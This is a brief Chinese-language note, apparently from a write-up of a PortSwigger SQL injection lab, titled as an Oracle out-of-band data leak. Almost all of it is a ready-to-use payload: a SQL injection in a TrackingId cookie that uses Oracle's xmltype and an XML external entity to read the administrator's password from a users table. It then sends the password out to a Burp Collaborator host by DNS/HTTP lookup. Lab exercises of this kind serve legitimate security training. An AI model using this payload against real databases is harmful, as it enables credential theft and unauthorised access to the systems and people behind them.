oracle数据库带外交互泄露数据

payload:

```javascript
TrackingId=wSR0EMmzIveEzi7k'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.n6uac1qxzsv0xqtqk04q6v0zyq4js8.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/SQL/images/9AEADE67B2494A78B48B05D38A4A66D6clipboard.png)

